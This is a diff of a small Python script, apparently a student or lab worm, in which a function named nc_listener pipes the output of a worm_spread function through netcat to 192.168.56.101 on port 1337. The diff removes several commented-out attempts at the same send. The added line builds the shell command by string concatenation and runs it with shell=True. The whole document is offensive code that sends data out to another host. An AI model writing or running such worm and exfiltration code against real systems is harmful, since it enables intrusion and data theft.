@@ -2,7 +2,6 @@
 
 import subprocess
 import re
-import os
 
 def worm_spread():
 
@@ -25,31 +24,9 @@ print(worm_spread())
 
 
 def nc_listener():
+    
+    listen_var="echo " + str(worm_spread()) + " | nc 192.168.56.101 1337"
 
-    #subprocess.call(["nc", "192.168.56.101", "1337"])
+    subprocess.call(listen_var, shell=True)
 
-    args=worm_spread()
-
-    child_process=subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-    child_process_output=child_process.communicate(["nc","192.168.56.101","1337"])
-    print(child_process_output)
-
-    #read, write = os.pipe()
-    #os.write(write, "worm_spread()")
-    #os.close(write)
-
-    #subprocess.check_call(["nc","192.168.56.101","1337"])
-
-    #p=Popen([xxxxxxxxxxx],stdout=subprocess.PIPE,stdin=subprocess.PIPE)
-    #p.stdin.write(worm_spread())
-    #p.communicate()[0]
-
-    #p1 = subprocess.call("nc '192.168.56.101' '1337' < worm_spread()", capture_output=True, text=True, shell=True)
-    #print(p1.stdout)
-
-    #subprocess.call('worm_spread() | nc 192.168.56.101 1337', capture_output=True, text=True, shell=True)
-    #print(p1.stdout)
-
-    #subprocess.call(["nc","192.168.56.101", "1337"], stdin = worm_spread(), stdout=None, stderr=None, shell=False)
-
-print(nc_listener())
+nc_listener()
